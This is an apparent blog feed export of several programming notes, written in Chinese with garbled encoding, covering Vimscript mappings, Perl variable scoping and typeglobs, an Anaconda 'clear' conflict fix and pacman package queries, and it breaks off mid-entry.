    <title>Vimscript-B-ç«™æ•™ç¨‹</title>
    <link href="/2022/12/11/Vimscript-B-%E7%AB%99%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/11/Vimscript-B-%E7%AB%99%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1mv411r7q6/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><h1 id="P1-expr-æ˜ å°„å’Œ-col-å‡½æ•°"><a href="#P1-expr-æ˜ å°„å’Œ-col-å‡½æ•°" class="headerlink" title="P1 expr æ˜ å°„å’Œ col å‡½æ•°"></a>P1 expr æ˜ å°„å’Œ col å‡½æ•°</h1><p>ä¸€ä¸ªä¾‹å­:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">noremap</span> <span class="hljs-symbol">&lt;expr&gt;</span>s <span class="hljs-keyword">col</span>(<span class="hljs-string">&quot;.&quot;</span>)==<span class="hljs-number">1</span>?<span class="hljs-string">&quot;$&quot;</span>:<span class="hljs-string">&quot;0&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>&lt;expr&gt;</code> æ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªé”®ä½. å®ƒè¡¨ç¤ºå°† <code>s</code> æ˜ å°„ä¸ºåé¢è¡¨è¾¾å¼çš„ç»“æœ.</p><p>è¿™é‡Œï¼Œ<code>col(&quot;.&quot;)==1?&quot;$&quot;:&quot;0&quot;</code> è¡¨è¾¾å¼çš„ç»“æœä¸º: è‹¥å½“å‰æ‰€åœ¨åˆ—ä¸º <code>1</code>, åˆ™ç»“æœä¸º <code>$</code>; è‹¥å½“å‰æ‰€åœ¨åˆ—ä¸ºä¸ä¸º <code>1</code>, åˆ™ç»“æœä¸º <code>0</code>. æ„æ€æ˜¯ <code>s</code> é”®ä¼šè¢«æ˜ å°„åˆ° <code>$</code> æˆ– <code>0</code> é”®.</p><h1 id="P2-expr-æ˜ å°„è¿›é˜¶ç”¨æ³•ä»¥åŠå·§ç”¨äº‹ä»¶å˜é‡v-count"><a href="#P2-expr-æ˜ å°„è¿›é˜¶ç”¨æ³•ä»¥åŠå·§ç”¨äº‹ä»¶å˜é‡v-count" class="headerlink" title="P2 expr æ˜ å°„è¿›é˜¶ç”¨æ³•ä»¥åŠå·§ç”¨äº‹ä»¶å˜é‡v:count"></a>P2 expr æ˜ å°„è¿›é˜¶ç”¨æ³•ä»¥åŠå·§ç”¨äº‹ä»¶å˜é‡v:count</h1><p><code>getline()</code> å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå¯ä»¥è¿™æ ·ä½¿ç”¨:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> test = <span class="hljs-built_in">getline</span>(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>]<br></code></pre></td></tr></table></figure><p>è¡¨ç¤ºè·å–è¿™ä¸€è¡Œçš„ç¬¬ 11 ä¸ªå­—ç¬¦åˆ°ç¬¬ 21 ä¸ªå­—ç¬¦.</p><p>ç”¨ <code>setreg()</code> å’Œ <code>getreg()</code> æ¥æ“ä½œå¯„å­˜å™¨.</p><p><code>getchar()</code> æ˜¯ä»é”®ç›˜è·å–ä¸€ä¸ªè¾“å…¥, å¹¶è¿”å›å…¶ ASCII ç .</p><h1 id="P3-å¾ªç¯è¯­å¥å’Œä¸€ä¸ªè¶…å¥½ç”¨æ’ä»¶åŠŸèƒ½çš„ç®€å•å®"><a href="#P3-å¾ªç¯è¯­å¥å’Œä¸€ä¸ªè¶…å¥½ç”¨æ’ä»¶åŠŸèƒ½çš„ç®€å•å®" class="headerlink" title="P3 å¾ªç¯è¯­å¥å’Œä¸€ä¸ªè¶…å¥½ç”¨æ’ä»¶åŠŸèƒ½çš„ç®€å•å®"></a>P3 å¾ªç¯è¯­å¥å’Œä¸€ä¸ªè¶…å¥½ç”¨æ’ä»¶åŠŸèƒ½çš„ç®€å•å®</h1><p><code>printf()</code> å‡½æ•°ï¼Œå’Œ C è¯­è¨€ä¸­å‡ ä¹ç›¸åŒ.</p><p><code>add()</code> å‡½æ•°ï¼Œåœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ å…ƒç´ .</p><h2 id="wildfire-æ’ä»¶åŠŸèƒ½å®ç°"><a href="#wildfire-æ’ä»¶åŠŸèƒ½å®ç°" class="headerlink" title="wildfire æ’ä»¶åŠŸèƒ½å®ç°"></a>wildfire æ’ä»¶åŠŸèƒ½å®ç°</h2><p><code>mode()</code> å‡½æ•°ï¼Œè¿”å›å½“å‰çš„æ¨¡å¼æ˜¯ä»€ä¹ˆ.</p><h1 id="P4-åˆ©ç”¨å¯„å­˜å™¨åœ¨insertæ¨¡å¼ä¸‹å®Œæˆä¸€äº›å¤æ‚è„š"><a href="#P4-åˆ©ç”¨å¯„å­˜å™¨åœ¨insertæ¨¡å¼ä¸‹å®Œæˆä¸€äº›å¤æ‚è„š" class="headerlink" title="P4 åˆ©ç”¨å¯„å­˜å™¨åœ¨insertæ¨¡å¼ä¸‹å®Œæˆä¸€äº›å¤æ‚è„š"></a>P4 åˆ©ç”¨å¯„å­˜å™¨åœ¨insertæ¨¡å¼ä¸‹å®Œæˆä¸€äº›å¤æ‚è„š</h1><p><code>=</code> è¿™ä¸ªå¯„å­˜å™¨å«åšè¡¨è¾¾å¼å¯„å­˜å™¨ï¼Œåœ¨æŒ‰ä¸‹ <code>&lt;Ctrl+r&gt;=</code> æ—¶ï¼Œä¼šè¦æ±‚è¾“å…¥è¡¨è¾¾å¼ï¼Œç„¶å insert çš„å†…å®¹å°±æ˜¯è¡¨è¾¾å¼çš„å€¼.</p><h1 id="P5-jobstartå¼‚æ­¥å‡½æ•°ä½¿ç”¨ä»¥åŠç¼–è¯‘å¤šæ–‡ä»¶å·¥ç¨‹"><a href="#P5-jobstartå¼‚æ­¥å‡½æ•°ä½¿ç”¨ä»¥åŠç¼–è¯‘å¤šæ–‡ä»¶å·¥ç¨‹" class="headerlink" title="P5 jobstartå¼‚æ­¥å‡½æ•°ä½¿ç”¨ä»¥åŠç¼–è¯‘å¤šæ–‡ä»¶å·¥ç¨‹"></a>P5 jobstartå¼‚æ­¥å‡½æ•°ä½¿ç”¨ä»¥åŠç¼–è¯‘å¤šæ–‡ä»¶å·¥ç¨‹</h1><p>åœ¨ç¼–è¯‘ä¹‹å‰å…ˆä¿å­˜æ–‡ä»¶:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">function!</span> <span class="hljs-title">Compile</span><span class="hljs-params">()</span><br>    exec <span class="hljs-string">&#x27;w&#x27;</span><br><span class="hljs-keyword">endfunction</span><br></code></pre></td></tr></table></figure><p><code>expand()</code> å‡½æ•°å¯ä»¥æ ¹æ®ä¿®é¥°ç¬¦è¿”å›ä¸åŒçš„å€¼.</p><p><code>jobstart()</code> å‡½æ•°ä¸ºå¼‚æ­¥å‡½æ•°.</p><h1 id="P6-å®ç°ä»£ç å—è¡¥å…¨-snippt-completion-å’Œå†…å®¹"><a href="#P6-å®ç°ä»£ç å—è¡¥å…¨-snippt-completion-å’Œå†…å®¹" class="headerlink" title="P6 å®ç°ä»£ç å—è¡¥å…¨(snippt completion)å’Œå†…å®¹"></a>P6 å®ç°ä»£ç å—è¡¥å…¨(snippt completion)å’Œå†…å®¹</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­çš„è¯æ³•å˜é‡å’ŒåŒ…å˜é‡</title>
    <link href="/2022/12/11/Perl-%E4%B8%AD%E7%9A%84%E8%AF%8D%E6%B3%95%E5%8F%98%E9%87%8F%E5%92%8C%E5%8C%85%E5%8F%98%E9%87%8F/"/>
    <url>/2022/12/11/Perl-%E4%B8%AD%E7%9A%84%E8%AF%8D%E6%B3%95%E5%8F%98%E9%87%8F%E5%92%8C%E5%8C%85%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="http://tadegenban.github.io/blog/2014/09/23/my-our-local-state.html">å‚è€ƒ</a></p><p>æ ¹æ®ä½œç”¨åŸŸçš„ä¸åŒæ¥åŒºåˆ†ï¼ŒPerl æœ‰ä¸¤ç§å˜é‡ç±»å‹:</p><ul><li>è¯æ³•å˜é‡ (Lexical Variable), å…·æœ‰ <mark>è¯æ³•ä½œç”¨åŸŸ</mark>, åªåœ¨å½“å‰è¯æ³•ä½œç”¨åŸŸå†…å¯è§</li><li>åŒ…å˜é‡ (Package Variable), å…¨å±€å˜é‡ï¼Œåœ¨ä»»ä½•ä½ç½®å¯è§</li></ul><p>ä¸‰ç§åˆ›å»ºå˜é‡çš„æ–¹å¼:</p><ul><li><code>my</code> â€“ åˆ›å»ºä¸€ä¸ªè¯æ³•å˜é‡</li><li><code>our</code> â€“ åˆ›å»ºä¸€ä¸ªè¯æ³•å˜é‡ï¼Œä½†å®é™…ä¸Šæ˜¯åŒ…å˜é‡çš„åˆ«åï¼Œæˆ–è€…è¯´æ˜¯ä¼ªè£…æˆè¯æ³•å˜é‡çš„åŒ…å˜é‡</li><li>ç›´æ¥ä½¿ç”¨ â€“ ä¸å£°æ˜ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å˜é‡.</li></ul><h1 id="è¯æ³•ä½œç”¨åŸŸçš„ç†è§£"><a href="#è¯æ³•ä½œç”¨åŸŸçš„ç†è§£" class="headerlink" title="è¯æ³•ä½œç”¨åŸŸçš„ç†è§£"></a>è¯æ³•ä½œç”¨åŸŸçš„ç†è§£</h1><p>è¯æ³•ä½œç”¨åŸŸç”¨æ¥é™åˆ¶å±€éƒ¨å˜é‡çš„åå­—ç”Ÿå­˜èŒƒå›´.</p><p>ä¸€ä¸ª block å°±æ˜¯ä¸€ä¸ªè¯æ³•ä½œç”¨åŸŸ.</p><h1 id="å¯¹-our-çš„ç†è§£"><a href="#å¯¹-our-çš„ç†è§£" class="headerlink" title="å¯¹ our çš„ç†è§£"></a>å¯¹ our çš„ç†è§£</h1><p>åœ¨ä¸€ä¸ªåŒ…ä¸­ï¼Œåªæœ‰å½“ä¸€ä¸ªå˜é‡ç”¨ <code>our</code> å£°æ˜ï¼Œæ‰èƒ½ç”¨ <code>$PKGNAME::VAR</code> åœ¨å…¶ä»–åŒ…ä¸­è®¿é—®.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> A;<br><span class="hljs-keyword">my</span> $foo = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">package</span> B;<br><span class="hljs-keyword">print</span> $A::foo;<br></code></pre></td></tr></table></figure><p>å°†ä¼šæŠ¥é”™.</p><p>è€Œå†™æˆ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> A;<br><span class="hljs-keyword">our</span> $foo = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">package</span> B;<br><span class="hljs-keyword">print</span> $A::foo;<br></code></pre></td></tr></table></figure><p>åˆ™å¯ä»¥è®¿é—®.</p><p>å› æ­¤ï¼Œ<code>our</code> è¿™ä¸ªå…³é”®è¯ç”¨åœ¨ï¼Œæƒ³è¦ä½¿ä¸€ä¸ªå˜é‡å¯ä»¥åœ¨å¤šä¸ªåŒ…ä¸­ä½¿ç”¨æ—¶.</p><h1 id="local"><a href="#local" class="headerlink" title="local"></a>local</h1><p><code>local</code> å¹¶ä¸åˆ›å»ºä¸€ä¸ªæ–°å˜é‡ï¼Œè€Œæ˜¯å¯¹å·²æœ‰çš„åŒ…å˜é‡ä¸´æ—¶èµ‹äºˆä¸€ä¸ªå€¼ï¼Œåœ¨æ¨å‡º scope åå°†åŸæ¥çš„å€¼è¿˜å›å».</p><p>å› æ­¤ï¼Œç”¨ <code>local</code> å£°æ˜æ–°å˜é‡ä¼šæŠ¥é”™.</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åŸºæœ¬ç”¨ <code>my</code>, éœ€è¦ç”¨å…¨å±€åŒ…æ—¶ç”¨ <code>our</code>.</p><p>ç‰¹å®šæ—¶ç”¨ <code>local</code> å’Œ <code>state</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ä¸‹è½½-anaconda-ä¹‹å-clear-å‘½ä»¤æŠ¥é”™</title>
    <link href="/2022/12/10/%E8%A7%A3%E5%86%B3%E4%B8%8B%E8%BD%BD-anaconda-%E4%B9%8B%E5%90%8E-clear-%E5%91%BD%E4%BB%A4%E6%8A%A5%E9%94%99/"/>
    <url>/2022/12/10/%E8%A7%A3%E5%86%B3%E4%B8%8B%E8%BD%BD-anaconda-%E4%B9%8B%E5%90%8E-clear-%E5%91%BD%E4%BB%A4%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>åŸå› æ˜¯å°† <code>anaconda</code> çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ·»åŠ åˆ° PATH ç¯å¢ƒå˜é‡ä¹‹åï¼Œå…¶ä¸­çš„ clear å‘½ä»¤å’ŒåŸæœ¬çš„ clear å‘½ä»¤å†²çªï¼Œè¿™é‡Œåˆ é™¤ anaconda ä¸­åŒ…å«çš„ clear å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo <span class="hljs-built_in">mv</span> <span class="hljs-variable">$CONDA_PREFIX</span>/bin/clear <span class="hljs-variable">$CONDA_PREFIX</span>/bin/clear_old<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux-ä¸­æŸ¥çœ‹è½¯ä»¶çš„å®‰è£…ä½ç½®</title>
    <link href="/2022/12/09/Archlinux-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE/"/>
    <url>/2022/12/09/Archlinux-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -Ql anaconda<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-è¯­è¨€ç¼–ç¨‹-Notes</title>
    <link href="/2022/12/09/Perl-%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B-Notes/"/>
    <url>/2022/12/09/Perl-%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬2ç« -é›†è…‹æˆè£˜"><a href="#ç¬¬2ç« -é›†è…‹æˆè£˜" class="headerlink" title="ç¬¬2ç«  é›†è…‹æˆè£˜"></a>ç¬¬2ç«  é›†è…‹æˆè£˜</h1><h2 id="2-2-åˆ†å­"><a href="#2-2-åˆ†å­" class="headerlink" title="2.2 åˆ†å­"></a>2.2 åˆ†å­</h2><p>Perl è¯†åˆ« token æ—¶é‡‡ç”¨çš„æ˜¯ä¸€ç§è´ªå©ªæ–¹å¼ï¼Œå¦‚æœç‰¹å®šæƒ…å†µä¸‹ Perl è§£æå™¨è¦åœ¨è¯†åˆ«ä¸€ä¸ªçŸ­ token è¿˜æ˜¯ä¸€ä¸ªé•¿ token ä¹‹é—´åšå‡ºé€‰æ‹©ï¼Œä»–è‚¯å®šä¼šé€‰æ‹©é•¿çš„é‚£ä¸€ä¸ª.</p><p>å¦‚æœæŸä¸€è¡Œä»¥ <code>=</code> å¼€å¤´ï¼Œè¿™ä¸ªè¯­å¥æ˜¯åˆæ³•çš„ï¼Œä»è¿™ä¸€è¡Œå‘ä¸‹ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªä»¥ <code>=cut</code> å¼€å¤´çš„è¡Œï¼Œè¿™ä¹‹é—´çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢« Perl å¿½ç•¥ï¼Œè¢«å¿½ç•¥çš„è¿™äº›æ–‡æœ¬ç§°ä¸º pod (plain old document, æ— æ ¼å¼æ—§å¼æ–‡æ¡£).</p><p>Perl çš„å‘å¸ƒç‰ˆæœ¬æä¾›äº†ä¸€äº›ç¨‹åºï¼Œå¯ä»¥ä» Perl æ¨¡å—æŠ½å– pod æ³¨é‡Šï¼Œå¹¶æŠŠå®ƒè½¬æ¢ä¸ºçº¯æ–‡æœ¬ï¼Œæ‰‹å†Œé¡µï¼ŒLaTeX, ç”šè‡³å¯ä»¥è½¬æ¢ä¸º HTML æˆ– XML æ–‡æ¡£.</p><h2 id="2-10-å‹å›¢-typeglob-å’Œæ–‡ä»¶å¥æŸ„"><a href="#2-10-å‹å›¢-typeglob-å’Œæ–‡ä»¶å¥æŸ„" class="headerlink" title="2.10 å‹å›¢ (typeglob) å’Œæ–‡ä»¶å¥æŸ„"></a>2.10 å‹å›¢ (typeglob) å’Œæ–‡ä»¶å¥æŸ„</h2><p>Perl çš„ç±»å‹å›¢ (typeglob) ç”¨ä»¥ä¿å­˜æ•´ä¸ªç¬¦å·è¡¨è®°å½•ï¼Œå³è¡¨ç¤ºæ‰€æœ‰ç±»å‹.</p><p><code>*foo</code> åŒ…æ‹¬ <code>$foo</code>, <code>@foo</code>, <code>%foo</code>, <code>&amp;foo</code> ç­‰. (æ¯•ç«Ÿ <code>*</code> è¿™ä¸ªä½œä¸ºé€šé…ç¬¦æ—¶è¡¨ç¤ºä»»æ„å­—ç¬¦)</p><p>ç±»å‹å›¢ (typeglob) çš„ä¸€ä¸ªç”¨é€”æ˜¯ç”¨äºä¼ é€’æˆ–è€…å­˜å‚¨æ–‡ä»¶å¥æŸ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$fh = *STDOUT;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$fh = \*STDOUT;<br></code></pre></td></tr></table></figure><p>å…¶ä¸»è¦ç”¨é€”æ˜¯èµ·åˆ«å:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*foo = *bar;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰å« <code>bar</code> çš„éƒ½å¯ä»¥ç”¨ <code>foo</code> æ›¿æ¢.</p><p>æˆ–åªç»™ç‰¹å®šç±»å‹èµ·åˆ«å:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*foo = \$bar;<br></code></pre></td></tr></table></figure><p>è¿™æ · <code>$foo</code> å°±æ˜¯ <code>$bar</code> çš„ä¸€ä¸ªåˆ«å.</p><p>æ‰€æœ‰è¿™äº›éƒ½åªå½±å“å…¨å±€ (åŒ…) å˜é‡ï¼Œè¯æ³•ä¸èƒ½é€šè¿‡ç¬¦å·è¡¨è®°å½•è®¿é—®.</p><p><code>qx//</code> (quoted excution, å³æ‰§è¡Œå‘½ä»¤) æ“ä½œç¬¦å’Œ `` çš„ä½œç”¨ç›¸åŒ, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$test_ls = <span class="hljs-string">`ls`</span>;<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$test_ls = <span class="hljs-keyword">qx</span>/ls/;<br></code></pre></td></tr></table></figure><h3 id="2-11-2-è¡Œè¾“å…¥-å°–è§’-æ“ä½œç¬¦"><a href="#2-11-2-è¡Œè¾“å…¥-å°–è§’-æ“ä½œç¬¦" class="headerlink" title="2.11.2 è¡Œè¾“å…¥ (å°–è§’) æ“ä½œç¬¦"></a>2.11.2 è¡Œè¾“å…¥ (å°–è§’) æ“ä½œç¬¦</h3><p><code>&lt;&gt;</code> å’Œ <code>readline</code> å‡½æ•°ä½œç”¨ç›¸åŒ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">glob</span> <span class="hljs-string">&quot;*.c&quot;</span>) &#123; <span class="hljs-keyword">chmod</span> <span class="hljs-number">0644</span>,$_; &#125;<br></code></pre></td></tr></table></figure><p>ç­‰æ•ˆäº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (&lt;*.c&gt;) &#123; <span class="hljs-keyword">chmod</span> <span class="hljs-number">0644</span>,$_; &#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬5ç« -æ¨¡å¼åŒ¹é…"><a href="#ç¬¬5ç« -æ¨¡å¼åŒ¹é…" class="headerlink" title="ç¬¬5ç«  æ¨¡å¼åŒ¹é…"></a>ç¬¬5ç«  æ¨¡å¼åŒ¹é…</h1><h2 id="5-2-æ¨¡å¼åŒ¹é…æ“ä½œç¬¦"><a href="#5-2-æ¨¡å¼åŒ¹é…æ“ä½œç¬¦" class="headerlink" title="5.2 æ¨¡å¼åŒ¹é…æ“ä½œç¬¦"></a>5.2 æ¨¡å¼åŒ¹é…æ“ä½œç¬¦</h2><h3 id="5-2-4-tr-æ“ä½œç¬¦-è½¬æ¢"><a href="#5-2-4-tr-æ“ä½œç¬¦-è½¬æ¢" class="headerlink" title="5.2.4 tr/// æ“ä½œç¬¦ (è½¬æ¢)"></a>5.2.4 <code>tr///</code> æ“ä½œç¬¦ (è½¬æ¢)</h3><h1 id="ç¬¬10ç« -åŒ…"><a href="#ç¬¬10ç« -åŒ…" class="headerlink" title="ç¬¬10ç«  åŒ…"></a>ç¬¬10ç«  åŒ…</h1><p>åœ¨ Perl ä¸­ï¼Œå‘½åç©ºé—´ç§°ä¸ºåŒ… (package)</p><p>ä¸€ä¸ªæ–‡ä»¶ä¸­å¯èƒ½æœ‰å¤šä¸ªåŒ…ï¼Œä¸€ä¸ªåŒ…ä¹Ÿå¯ä»¥è·¨å¤šä¸ªæ–‡ä»¶.</p><p>Perl é‡åˆ°ä¸€ä¸ªä»£ç å—æ—¶ï¼Œä¼šæŠŠå®ƒç¼–è¯‘ä¸ºæˆ‘ä»¬æ‰€ç§°çš„å½“å‰åŒ… (current package), åˆå§‹çš„å½“å‰åŒ…åä¸º â€œmainâ€, ä¸è¿‡ä½ å¯ä»¥åœ¨ä»»ä½•æ—¶åˆ»ç”¨ <code>package</code> å£°æ˜æŠŠå½“å‰åŒ…åˆ‡æ¢ä¸ºå¦ä¸€ä¸ªåŒ…ï¼Œå½“å‰åŒ…ç¡®å®šäº†è¦ä½¿ç”¨å“ªä¸ªç¬¦å·è¡¨æ¥æŸ¥æ‰¾å˜é‡ï¼Œå­ä¾‹ç¨‹ï¼ŒI&#x2F;O å¥æŸ„å’Œæ ¼å¼.</p><h2 id="ç¬¦å·è¡¨"><a href="#ç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·è¡¨"></a>ç¬¦å·è¡¨</h2><p>åŒ…çš„å†…å®¹ç§°ä¸ºç¬¦å·è¡¨ (symbol table). ç¬¦å·è¡¨å­˜å‚¨åœ¨ä¸€ä¸ªæ•£åˆ—ä¸­ï¼Œè¿™ä¸ªæ•£åˆ—ä¸åŒ…åŒåï¼Œä¸è¿‡åé¢é™„åŠ ä¸¤ä¸ªå†’å·.</p><p>å› æ­¤ï¼Œ<code>main</code> ç¬¦å·è¡¨çš„åç§°å°±æ˜¯ <code>%main::</code>, ç”±äº <code>main</code> æ­£å¥½æ˜¯é»˜è®¤åŒ…ï¼ŒPerl æä¾›äº† <code>%::</code> ä½œä¸º <code>%main::</code> çš„ç®€å†™å½¢å¼.</p><p>æˆ‘ä»¬è¯´ä¸€ä¸ªç¬¦å·è¡¨ â€œåŒ…å«â€ å¦ä¸€ä¸ªç¬¦å·è¡¨æ—¶ï¼Œæ˜¯æŒ‡å®ƒåŒ…å«å¦ä¸€ä¸ªç¬¦å·è¡¨çš„ä¸€ä¸ªå¼•ç”¨ï¼Œç”±äº <code>main</code> æ˜¯é¡¶å±‚åŒ…ï¼Œå®ƒåŒ…å«å®ƒæœ¬èº«çš„ä¸€ä¸ªå¼•ç”¨, æ‰€ä»¥ <code>%main::</code> ç­‰äº <code>%main::main::</code> ç­‰äº <code>%main::main::main::</code>, ä»¥æ­¤ç±»æ¨. éå†ç¬¦å·è¡¨æ—¶éœ€è¦æ³¨æ„. </p><p>åœ¨ä¸€ä¸ªç¬¦å·è¡¨çš„æ•£åˆ—ä¸­ï¼Œæ¯ä¸ªé”®&#x2F;å€¼å¯¹å°†ä¸€ä¸ªå˜é‡åæ˜ å°„åˆ°è¿™ä¸ªå˜é‡çš„å€¼.</p><p>å› ä¸ºåŒ…æ˜¯æ•£åˆ—, å› æ­¤ä½ å¯ä»¥æ‰¾å‡ºè¯¥åŒ…çš„é”®å­—ç„¶åè·å–æ‰€æœ‰åŒ…ä¸­çš„å˜é‡. å› æ­¤è¯¥æ•£åˆ—çš„æ•°å€¼éƒ½æ˜¯ç±»å‹å›¢, å¯ä»¥ç”¨å¥½å‡ ç§æ–¹æ³•è§£å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> $symname (<span class="hljs-keyword">sort</span> <span class="hljs-keyword">keys</span> %main::) &#123;<br>    <span class="hljs-keyword">local</span> *sym = $main::&#123;$symname&#125;;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\$$symname is defined\n&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">defined</span> $sym;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\@$symname is nonnull\n&quot;</span> <span class="hljs-keyword">if</span> @sym;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\%$symname is defined\n&quot;</span> <span class="hljs-keyword">if</span> %sym;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><mark>å¦ä¸€ä¸ªç¬¦å·è¡¨çš„ç”¨æ³•</mark> æ˜¯åˆ¶ä½œ â€œå¸¸é‡â€ æ ‡é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*PI = \<span class="hljs-number">3.14159265358979</span>;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±ä¸èƒ½æ›´æ”¹ <code>$PI</code>.</p><p>æˆ–è€…ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> constant <span class="hljs-string">PI =&gt;</span> <span class="hljs-number">3.14159</span>;<br></code></pre></td></tr></table></figure><p>å½“ä½ æ‰§è¡Œä»»æ„ä¸‹åˆ—çš„èµ‹å€¼æ—¶, å®é™…ä¸Šåªæ˜¯æ›¿æ¢äº†ç±»å‹å›¢é‡Œçš„ä¸€ä¸ªå¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">*sym = \$frodo;<br>*sym = \@sam;<br>*sym = \%merry;<br>*sym = \&amp;pippin;<br></code></pre></td></tr></table></figure><p>ä»å¦ä¸€ä¸ªè§’åº¦è€ƒè™‘, ç±»å‹å›¢æœ¬èº«å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§æ•£åˆ—, å®ƒé‡Œé¢æœ‰ä¸åŒç±»å‹çš„å˜é‡è®°å½•. åœ¨è¿™ç§æƒ…å†µä¸‹, é”®å­—æ˜¯å›ºå®šçš„, å› ä¸ºä¸€ä¸ªç±»å‹å›¢æ­£å¥½å¯ä»¥åŒ…å«ä¸€ä¸ªæ ‡é‡, ä¸€ä¸ªæ•£åˆ—ç­‰ç­‰. å¯ä»¥å»é™¤ç‹¬ç«‹çš„å¼•ç”¨, å¦‚:</p><figure class="highlight 